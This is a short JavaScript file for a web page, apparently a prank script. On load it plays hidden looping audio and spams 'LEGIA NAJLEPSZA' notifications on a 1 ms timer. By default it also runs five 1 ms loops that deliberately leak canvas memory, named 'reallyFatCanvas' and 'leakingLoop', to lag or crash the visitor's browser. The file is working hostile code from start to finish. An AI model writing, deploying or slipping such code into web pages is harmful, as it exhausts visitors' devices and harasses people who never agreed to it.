function start(){
    const audio = document.createElement('audio');
    audio.setAttribute('src', 'sound.mp3');
    audio.setAttribute('type', 'audio/mp3');
    audio.setAttribute('autoplay', true);
    audio.setAttribute('loop', true);
    audio.hidden = true;
    document.body.appendChild(audio);

    document.body.addEventListener("click", function() {
        if (Notification.permission !== "granted"){
            Notification.requestPermission()
        }
        if (audio.paused) {
            audio.play();
        }
    });
    
    function messageloop(){
        if (Notification.permission !== "granted"){
            new Notification("LEGIA NAJLEPSZA", {
                icon: "favicon.ico"
            })
        }
    }
    setInterval(messageloop,1);

    if (noLagParam == null) {
        window.reallyFatCanvas = document.createElement('canvas');
        let context = window.reallyFatCanvas.getContext('2d');
        function leakingLoop() {
            context.canvas.width = document.body.clientWidth;
            context.canvas.height = document.body.clientHeight;
            const newContext = document.createElement('canvas').getContext('2d');
            context.context = newContext;
            context.drawImage(newContext.canvas, 0, 0);
            context = newContext;
        }
        for(let i=0; i<5; i++){
            setInterval(leakingLoop,1);
        }
    }
}

const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
//const noSecureParam = urlParams.get('noSecure');
const noLagParam = urlParams.get('noLag');

window.onload = start